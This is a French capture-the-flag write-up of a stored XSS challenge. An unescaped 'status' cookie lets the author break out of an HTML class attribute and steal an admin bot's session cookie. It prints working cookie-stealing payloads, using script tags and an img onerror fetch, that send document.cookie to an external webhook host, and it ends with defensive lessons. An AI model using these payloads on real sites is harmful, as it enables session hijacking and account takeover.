---
layout: default
---

# XSS Stockee 2 : le cookie que personne surveillait

## "C'est trop calme ce formulaire... j'aime pas trop beaucoup ca"

Bon. Me voila devant un forum web. Un forum tout bete avec un champ titre, un champ message, un bouton "Envoyer". Challenge de difficulte moyenne, qu'ils disent. Je me frotte les mains, je me dis ca va aller vite. Sur la tete de ma mere, a chaque fois que je dis ca, c'est le debut d'une longue soiree.

Le brief : une section admin protegee par un cookie, un bot administrateur qui passe lire les messages du forum. Mon objectif, lui voler son cookie d'authentification. Du XSS stocke. Classique. Enfin ca, c'est ce que je croyais.

---

## Reconnaissance : on fait le tour du proprietaire

J'ouvre le forum, j'inspecte. Formulaire POST : titre + message. Une section admin accessible via `?section=admin` qui me rembarre parce que j'ai pas le bon cookie. Normal. En arrivant sur le site, le serveur me pose un cookie :

```
Set-Cookie: status=invite
```

"Invite." Merci, ca fait plaisir, on se sent vraiment le bienvenu.

Je fouille le code source et la, je repere un detail. La valeur du cookie `status` est injectee dans le HTML :

```html
<i class="invite">status : invite</i>
```

Elle apparait deux fois : dans l'attribut `class` et dans le contenu de la balise. Le contenu est HTML-encode. Mais l'attribut `class`... rien du tout. Aucun echappement. Je note ca dans un coin de ma tete et je passe a la suite.

---

## Les fausses pistes : quand ca veut pas, ca veut pas

### Le titre qui filtre

Premier reflexe, j'injecte dans le titre :

```
<script>alert(1)</script>
```

Refuse net. Le serveur rejette les balises HTML dans le titre. D'accord.

### Le message qui encode

Je me rabats sur le message. Meme tentative. Le message passe, mais a l'affichage, tout est encode : `<` devient `&lt;`, `>` devient `&gt;`. Mon payload ressemble a un texto de mon oncle qui decouvre Internet.

Les deux champs classiques sont proteges. Titre qui filtre, message qui encode. Je me retrouve bloque devant mon ecran. C'est trop calme... j'aime pas trop beaucoup ca... j'prefere quand c'est un peu trop plus moins calme.

Mais quand c'est trop calme, c'est qu'il y a un truc planque quelque part.

---

## Le vrai vecteur : on brise l'attribut

Je reviens sur cette balise `<i>`. Le cookie `status` est injecte SANS ECHAPPEMENT dans l'attribut `class`. Si je modifie mon cookie pour y glisser un guillemet double, je brise l'attribut et j'injecte du HTML arbitraire dans la page. Et comme cette page est servie a tous les visiteurs du forum -- y compris le bot admin -- mon payload sera execute dans SON navigateur.

Le plan d'attaque est simple : je forge un cookie `status` malveillant, je poste un message sur le forum avec ce cookie, et le serveur va stocker la page avec mon HTML injecte. Quand le bot admin passe lire le forum, boum.

### Tentative 3 : `<script>` -- le piege

Je commence par un payload classique :

```
status=invite"><script>document.location='https://webhook.lab/steal?c='+document.cookie</script><i class="
```

Le HTML s'injecte parfaitement, je vois mon `<script>` dans le code source. Je poste, j'attends, je fixe mon webhook... et rien. Le bot passe, mais pas de requete recue. Je tente une variante :

```
status=invite"><script>new Image().src='https://webhook.lab/steal?c='+document.cookie</script><i class="
```

Toujours rien. La je commence a rager. "Dites-moi pas que c'est pas vrai !" Mon script est la, dans le DOM, bien visible, et il s'execute pas. Pourquoi ? Parce que les balises `<script>` injectees dynamiquement dans le DOM (via `innerHTML` ou insertion serveur post-parsing) ne sont PAS executees par les navigateurs modernes. C'est une regle du standard HTML. Je l'avais lue cent fois et je tombe quand meme dans le piege. Tu rends compte.

### Tentative 4 : `<img onerror>` -- ca passe

Les event handlers, eux, fonctionnent tres bien sur des elements injectes. Une balise `<img>` avec un `src` invalide va declencher son `onerror` immediatement :

```
status=invite"><img src=x onerror="fetch('https://webhook.lab/steal?c='+document.cookie)"><i class="
```

Ce qui donne dans le HTML :

```html
<i class="invite"><img src=x onerror="fetch('https://webhook.lab/steal?c='+document.cookie)"><i class="">
  status : invite&quot;&gt;&lt;img ...
</i>
```

L'attribut `class` est brise. Ma balise `<img>` vit sa meilleure vie dans le DOM. L'image `src=x` n'existe pas, le `onerror` se declenche, le `fetch` envoie les cookies du visiteur vers mon serveur.

---

## Le flag : deux minutes de patience

Je poste le message avec mon cookie forge. J'attends. Le bot admin passe environ deux minutes plus tard. Mon webhook recoit :

```
GET /steal?c=status=invite;admin=REDACTED HTTP/1.1
```

Samerlipopette. Le cookie admin est la. Je le pose dans mon navigateur, je navigue vers `?section=admin`, et le flag apparait. Comme ca. Apres tout ce cirque.

```
Flag : E5HKEGyCXQVsYaehaqeJs0AfV
```

Ca fait plaisir. Ca fait VRAIMENT plaisir. Le genre de plaisir que tu connais qu'apres avoir galere pendant des heures sur des fausses pistes. C'est comme quand tu sors de scene au Comedy Club et que la salle a ri : t'as souffert en coulisses, mais le resultat est la.

---

## Ce qu'on retient

| Concept | Detail |
|---|---|
| **Vecteur XSS inattendu** | Le cookie `status` refleter dans un attribut HTML sans echappement |
| **Injection dans un attribut** | Briser un attribut avec `"` pour injecter du HTML arbitraire |
| **`<script>` vs event handlers** | Les `<script>` injectes dynamiquement ne s'executent pas ; utiliser `<img onerror>` ou `<svg onload>` |
| **Defense en profondeur** | Proteger titre et message ne suffit pas si d'autres entrees (cookies) sont negligees |
| **Donnee client = donnee hostile** | Toute valeur provenant du navigateur (cookies inclus) doit etre echappee avant injection dans le HTML |

La lecon du jour : les devs avaient blinde les entrees evidentes -- titre filtre, message encode. Propre. Mais le cookie `status`, lui, passait direct dans l'attribut `class` sans aucun traitement. En securite web, il n'y a pas d'entree "de confiance". Si ca vient du client, ca se sanitize. Point.

---

## References techniques

- [OWASP - Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger - Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
- [MDN - innerHTML et les balises script](https://developer.mozilla.org/fr/docs/Web/API/Element/innerHTML)
- [HackTricks - XSS Cookie Injection](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)

## Outils utilises

- **Navigateur web** (DevTools) : inspection du DOM, modification des cookies, analyse des requetes
- **Webhook externe** (type RequestBin) : reception du cookie exfiltre
- **curl** : envoi de requetes POST avec cookies forges pour tester les payloads
